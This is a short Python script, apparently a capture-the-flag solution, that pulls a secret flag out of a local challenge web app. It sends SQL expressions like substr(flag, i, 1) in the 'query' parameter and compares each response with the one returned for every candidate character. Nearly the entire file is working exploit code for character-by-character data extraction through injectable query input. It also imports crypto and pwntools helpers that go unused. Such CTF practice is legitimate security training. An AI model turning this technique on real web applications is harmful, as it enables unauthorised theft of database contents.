import string

import requests
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from pwn import *
from pwn import context, enhex, log, process, remote, unhex, xor

# PKCS#7 default pad()

context.log_level = "info"

charset = string.printable.strip()

URL = "http://challenge.localhost/"
CHARSET = string.printable.strip() + "}"

log.info("Start")

result = ""

for i in range(1, 60):
    payload = f"substr(flag, {i}, 1)"
    r = requests.get(URL, params={"query": payload})

    if r.status_code == 200:
        res = r.text.split("<b>Results:</b><pre>")[1].split("</pre>")[0]

        for c in charset:
            payload = f"'{c}'"
            r = requests.get(URL, params={"query": payload})

            if r.status_code == 200:
                ser = r.text.split("<b>Results:</b><pre>")[1].split("</pre>")[0]
                if res == ser:
                    log.success(f"Found: {c} at {i}")
                    result += c
                    break

print(result)
